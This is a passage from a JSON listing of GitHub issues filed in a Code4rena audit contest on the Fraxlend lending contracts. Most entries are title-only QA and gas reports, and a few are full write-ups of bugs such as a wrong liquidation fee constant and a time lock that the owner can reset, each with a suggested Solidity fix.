"2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/314", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/313", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/312", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/310", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/309", "labels": ["bug", "G (Gas Optimization)", "low quality report"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/308", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/306", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/304", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/302", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/301", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/300", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/299", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/297", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/289", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/281", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Wrong assumption of block time might cause wrong interest rate", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/276", "labels": ["bug", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairConstants.sol#L41 https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/LinearInterestRate.sol#L34 https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/VariableInterestRate.sol#L40 https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/VariableInterestRate.sol#L41   # Vulnerability details  ## Impact  All annual rate constants in the system are calculated with an assumption that block time is 15 second (actually it\u2019s from 12 to 14 seconds as in [the documentation](https://ethereum.org/vi/developers/docs/blocks/#block-time). And these constants are used to calculate rate in rate calculator and also used to reset interest rate when there are no borrows.  But actually, [the merge is really near](https://ethereum.org/vi/upgrades/merge/) and after the merge blocks come exactly each 12 seconds which basically makes all these constants wrong.   This resulted in wrong interest rate after reseting when there are no borrows and wrong rate returned by rate calculators.  ## Proof of Concept  These annual rate is calculated by solving an equation for `r` with an assumption 365.24 days per year and 15s blocks. For example, this is for the 0.5% annual rate ``` 1.005 = (1 + 15*r)^(365.24 * 24 * 3600 / 15) ```   But actually after the merge, blocks come in exactly each 12 seconds. Check out [this blog post](https://blog.ethereum.org/2021/11/29/how-the-merge-impacts-app-layer/) of Tim Beiko   [Line 431-433](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L431-L433) reset interest rate when there are no borrows ```solidity if (!paused()) {     _currentRateInfo.ratePerSec = DEFAULT_INT; } ```  These constants are used in `requireValidInitData()` and also `getNewRate()` function in rate calculators and wrong constants might make `getNewRate()` return wrong value. For example, [line 72-74](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/VariableInterestRate.sol#L72-L74) used `MIN_INT` as new interest rate ```solidity if (_newRatePerSec < MIN_INT) {     _newRatePerSec = MIN_INT; } ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider to update these constants with an assumption that block time is 12 seconds. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/275", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/272", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/271", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/269", "labels": ["bug", "high quality report", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/268", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/267", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/265", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/263", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/262", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/261", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/260", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/255", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/253", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/246", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/245", "labels": ["bug", "G (Gas Optimization)", "high quality report", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/241", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Wrong percent for `FraxlendPairCore.dirtyLiquidationFee`.", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/238", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L194   # Vulnerability details  ## Impact After confirmed with the sponsor, `dirtyLiquidationFee` is 90% of `cleanLiquidationFee` like the [comment](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L194).  But it uses `9% (9000 / 1e5 = 0.09)` and the fee calculation will be wrong [here](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L988-L990).   ## Tools Used Manual Review   ## Recommended Mitigation Steps We should change `9000` to `90000`.  ``` dirtyLiquidationFee = (_liquidationFee * 90000) / LIQ_PRECISION; // 90% of clean fee ```"}, {"title": "FraxlendPair.changeFee() doesn't update interest before changing fee.", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/236", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L215-L222   # Vulnerability details  ## Impact This function is changing the protocol fee that is used during interest calculation [here](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L477-L488).  But it doesn't update interest before changing the fee so the `_feesAmount` will be calculated wrongly.   ## Proof of Concept As we can see during [pause()](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L326) and [unpause()](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L335), `_addInterest()` must be called before any changes.  But with the [changeFee()](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L215), it doesn't update interest and the `_feesAmount` might be calculated wrongly.  - At time `T1`, [_currentRateInfo.feeToProtocolRate = F1](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L477). - At `T2`, the owner had changed the fee to `F2`. - At `T3`, [_addInterest()](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L409) is called during `deposit()` or other functions. - Then [during this calculation](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L477-L488), `F1` should be applied from `T1` to `T2` and `F2` should be applied from `T2` and `T3`. But it uses `F2` from `T1` to `T2`.   ## Tools Used Manual Review   ## Recommended Mitigation Steps Recommend modifying `changeFee()` like below.  ``` function changeFee(uint32 _newFee) external whenNotPaused {     if (msg.sender != TIME_LOCK_ADDRESS) revert OnlyTimeLock();     if (_newFee > MAX_PROTOCOL_FEE) {         revert BadProtocolFee();     }      _addInterest(); //+++++++++++++++++++++++++++++++++      currentRateInfo.feeToProtocolRate = _newFee;     emit ChangeFee(_newFee); } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/232", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "No Transfer Ownership Pattern", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/231", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "No Transfer Ownership Pattern"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/226", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/222", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/220", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/219", "labels": ["bug", "G (Gas Optimization)", "high quality report"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/218", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/217", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/216", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/215", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/214", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/213", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/211", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/210", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/208", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/205", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/202", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Decimals limitation limits the tokens that can be used", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/200", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor disputed"], "target": "2022-08-frax-findings", "body": "Decimals limitation limits the tokens that can be used"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/199", "labels": ["bug", "high quality report", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/198", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/197", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/196", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/195", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/194", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/193", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/191", "labels": ["bug", "high quality report", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/190", "labels": ["bug", "G (Gas Optimization)", "high quality report"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "architectal issue enable users to take unsafe loans", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/188", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-frax-findings", "body": "architectal issue enable users to take unsafe loans"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/186", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/181", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/180", "labels": ["bug", "G (Gas Optimization)", "high quality report"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/178", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/174", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/173", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/170", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Fraxlend pair deployment can be front-run by a custom pair deployment", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/166", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "Fraxlend pair deployment can be front-run by a custom pair deployment"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/163", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/160", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Approved lenders and borrowers can allow and block any arbitrary address", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/157", "labels": ["bug", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-frax-findings", "body": "Approved lenders and borrowers can allow and block any arbitrary address"}, {"title": "Owner of `FraxlendPair` can set arbitrary time lock contract address to circumvent time lock", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/156", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L206   # Vulnerability details  ## Impact  The ownership of a deployed Fraxlend pair is transferred to `COMPTROLLER_ADDRESS` on deployment via `FraxlendPairDeployer_deploySecond`. This very owner is able to change the currently used time lock contract address with the `FraxlendPair.setTimeLock` function. A time lock is enforced on the `FraxlendPair.changeFee` function whenever the protocol fee is adjusted.  However, as the Fraxlend pair owner is able to change the time lock contract address to any other arbitrary (contract) address, it is possible to circumvent this timelock without users knowing. By using a custom smart contract without an enforced time lock, the protocol fee can be changed at any time without a proper time lock.  ## Proof of Concept  [FraxlendPair.sol#L206](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L206)  ````solidity /// @notice The ```setTimeLock``` function sets the TIME_LOCK address /// @param _newAddress the new time lock address function setTimeLock(address _newAddress) external onlyOwner {     emit SetTimeLock(TIME_LOCK_ADDRESS, _newAddress);     TIME_LOCK_ADDRESS = _newAddress; } ````  ## Tools Used  Manual review  ## Recommended mitigation steps  Currently, the owner `COMPTROLLER_ADDRESS` address is trustworthy, however, nothing prevents the above-described scenario. To protect users from sudden protocol fee changes, consider using a minimal time lock implementation directly implemented in the contract without trusting any external contract. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/155", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Impossible to `setCreationCode()` with code size less than 13K", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/153", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "high quality report", "sponsor acknowledged"], "target": "2022-08-frax-findings", "body": "Impossible to `setCreationCode()` with code size less than 13K"}, {"title": "A malicious borrower/lender could either add or remove other borrowers/lenders from the approvedBorrowers/approvedLenders mapping ", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/152", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "A malicious borrower/lender could either add or remove other borrowers/lenders from the approvedBorrowers/approvedLenders mapping "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/149", "labels": ["bug", "G (Gas Optimization)", "high quality report", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Interest can be significantly lower if `addInterest` isn't called frequently enough ", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/145", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-08-frax-findings", "body": "Interest can be significantly lower if `addInterest` isn't called frequently enough "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/144", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/143", "labels": ["bug", "high quality report", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "`liquidate()` doesn't mark off bad debt, leading to a 'last lender to withdraw looses' scenario", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/141", "labels": ["bug", "3 (High Risk)"], "target": "2022-08-frax-findings", "body": "`liquidate()` doesn't mark off bad debt, leading to a 'last lender to withdraw looses' scenario"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/139", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/138", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/137", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Malicious Approved Lender can remove all other approved lenders effectively denying access to lending and liquidations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/135", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "Malicious Approved Lender can remove all other approved lenders effectively denying access to lending and liquidations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/134", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "high quality report"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/130", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "FraxlendPair#setTimeLock: Allows the owner to reset TIME_LOCK_ADDRESS", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/129", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L84-L86 https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L204-L207   # Vulnerability details  ## Impact Allows to reset **TIME_LOCK_ADDRESS** value multiple times by the owner. According to comments in FraxlendPairCore this should act as a constant/immutable value. Given that this value will be define through function **setTimeLock** in **FraxLendPair** contract this value can changed whenever the owner wants. This does not seem the expected behaviour.  ## Proof of Concept The owner can call whenever they want the function **setTimeLock**, which reset the value of **TIME_LOCK_ADDRESS**  ## Tools Used Manual read  ## Recommended Mitigation Steps Add a bool which act as mutex if **TIME_LOCK_ADDRESS** has already been set, and modify **setTimeLock** function in FraxlendPair contract ```solidity // In FraxlendPair contract bool public timelockSetted; function setTimeLock(address _newAddress) external onlyOwner {         require(!timelockSetted);         emit SetTimeLock(TIME_LOCK_ADDRESS, _newAddress);         TIME_LOCK_ADDRESS = _newAddress;         timelockeSetted=true; } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/128", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/127", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/125", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/124", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/123", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/122", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/121", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/116", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/114", "labels": ["bug", "G (Gas Optimization)", "high quality report"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/113", "labels": ["bug", "G (Gas Optimization)", "low quality report"], "target": "2022-08-frax-findings", "body": "Gas Optimizations"}, {"title": "Penalty rate is used for pre-maturity date as well", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/111", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "sponsor acknowledged", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "Penalty rate is used for pre-maturity date as well"}, {"title": "Unprotected updation of whitelist", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/107", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)"], "target": "2022-08-frax-findings", "body": 